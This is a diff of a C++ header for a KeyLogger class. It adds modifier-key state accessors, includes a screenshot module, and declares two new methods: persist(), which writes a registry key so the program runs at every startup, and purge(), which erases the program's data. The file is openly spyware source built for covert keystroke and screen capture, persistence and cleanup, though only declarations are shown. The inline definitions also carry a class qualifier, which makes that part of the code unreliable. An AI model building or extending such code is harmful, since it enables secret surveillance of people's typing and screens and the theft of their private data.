@@ -12,6 +12,9 @@
 
 #include "screenshot.h"
 
+//registry key name
+#define REGKEY_NAME "keylogger"
+
 //Keyboard codes
 #define SC_CTRL 29
 #define SC_LSHIFT 42
@@ -31,25 +34,31 @@ class KeyLogger {
     //starts listenning
     void listen();
 
-	//alt keyboard modifier
-    bool isAltDown();
-    void setAltDown(bool down);
+	//ALT state
+	bool KeyLogger::isAltDown() { return altDown; }
+	void KeyLogger::setAltDown(bool down) { altDown = down; }
 
-	//ctrl keyboard modifier
-    bool isCtrlDown();
-    void setCtrlDown(bool down);
+	//CTRL state
+	bool KeyLogger::isCtrlDown() { return ctrlDown; }
+	void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }
 
-	//left shift keyboard modifier
-    bool isLShiftDown();
-    void setLShiftDown(bool down);
+	//LEFT SHIFT state
+	bool KeyLogger::isLShiftDown() { return lshiftDown; }
+	void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
+	
+	//RIGHT SHIFT state
+	bool KeyLogger::isRShiftDown() { return rshiftDown; }
+	void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
-	//right shift
-    bool isRShiftDown();
-    void setRShiftDown(bool down);
+	//writes to registry to make the program launch at every startup
+	void persist(std::string programName);
+
+	//erases program data
+	void purge();
 
     protected:
 
-    KeyLogger(std::string logFilePath = "out.txt");
+    KeyLogger();
     ~KeyLogger();
 
 	void log(std::string text);
